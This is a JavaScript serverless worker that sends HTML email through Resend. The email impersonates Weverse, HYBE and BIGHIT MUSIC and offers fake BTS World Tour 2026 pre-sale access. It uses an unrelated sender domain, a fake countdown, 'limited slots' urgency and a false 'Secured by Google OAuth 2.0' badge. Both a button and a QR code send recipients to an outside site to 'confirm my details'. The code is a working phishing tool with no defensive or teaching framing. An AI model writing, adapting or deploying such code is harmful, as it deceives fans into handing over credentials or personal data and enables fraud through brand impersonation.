import { Resend } from 'resend';

export default {
  async fetch(request, env) {
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'Method not allowed. Use POST.' }), {
        status: 405,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    try {
      const { firstName, email } = await request.json();

      if (!firstName || !email) {
        return new Response(JSON.stringify({ success: false, error: 'Missing firstName or email' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      const resend = new Resend(env.RESEND_API_KEY);

      const htmlContent = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BTS World Tour 2026 — Priority Access</title>
    <style>
        body { margin: 0; padding: 0; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; -webkit-font-smoothing: antialiased; }
        .wrap { max-width: 600px; margin: 0 auto; background: #fff; }
        .head { background: #191919; padding: 40px 24px; text-align: center; }
        .logo { width: 72px; height: 72px; background: #fff; border-radius: 20px; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 36px; font-weight: 800; color: #191919; }
        .head p { color: #888; margin: 0; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; }
        .body { padding: 40px 32px; text-align: center; }
        .scan-header { font-size: 15px; font-weight: 700; color: #6B35A8; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
        .urgency { color: #d32f2f; font-size: 13px; font-weight: 600; margin-bottom: 12px; }
        .countdown { font-size: 18px; font-weight: 700; color: #d32f2f; margin-bottom: 20px; }
        .badge { display: inline-block; background: #f0fdf4; color: #16a34a; padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
        h1 { color: #191919; font-size: 28px; margin: 0 0 16px; font-weight: 700; line-height: 1.2; }
        .lead { color: #666; font-size: 16px; line-height: 1.6; margin: 0 0 32px; }
        .btn { display: inline-block; background: #7c3aed; color: #fff; padding: 18px 40px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; box-shadow: 0 4px 16px rgba(124,58,237,0.3); }
        .qr-container { margin: 24px 0; }
        .qr-container img { border: 12px solid white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .secure { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 20px; font-size: 12px; color: #16a34a; }
        .foot { background: #fafafa; padding: 24px; text-align: center; border-top: 1px solid #f0f0f0; }
        .foot p { margin: 0; font-size: 12px; color: #aaa; }
        @media (max-width: 480px) { .body { padding: 32px 24px; } h1 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="head">
            <div class="logo">W</div>
            <p>Weverse • Official Fan Platform</p>
        </div>
        <div class="body">
            <p class="scan-header">SCAN FOR PRIORITY ACCESS</p>
            <p class="urgency">Limited slots remaining • Pre-sale window closing soon</p>
            
            <!-- Live-style countdown for email -->
            <div class="countdown">14:59 remaining</div>
            
            <div class="badge">★ Priority Member</div>
            <h1>Your Pre-Sale Access is Ready</h1>
            <p class="lead">You've been selected for ARMY Priority Access to BTS World Tour 2026. Confirm your details to secure your allocation window.</p>
            
            <a href="https://brigit.work/" class="btn">Confirm My Details →</a>
            
            <!-- Small QR Code inside the email -->
            <div class="qr-container">
              <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://brigit.work/" alt="Scan for Priority Access">
            </div>
            <p style="font-size:13px; color:#666;">Or scan the QR code above for instant verification</p>
            
            <div class="secure"><span>🔒</span><span>Secured by Google OAuth 2.0</span></div>
        </div>
        <div class="foot">
            <p>© 2026 Weverse Co., Ltd. • HYBE</p>
        </div>
    </div>
</body>
</html>`;

      const { data, error } = await resend.emails.send({
        from: 'BIGHIT MUSIC <noreply@jesusgeneration.vip>',
        to: email,
        subject: 'SCAN FOR PRIORITY ACCESS — BTS World Tour 2026',
        html: htmlContent,
        headers: {
          'List-Unsubscribe': '<https://brigit.work/unsubscribe>, <mailto:unsubscribe@brigit.work?subject=unsubscribe>',
          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click'
        }
      });

      if (error) {
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify({ success: true, data }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });

    } catch (err) {
      return new Response(JSON.stringify({ success: false, error: err.message }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }
};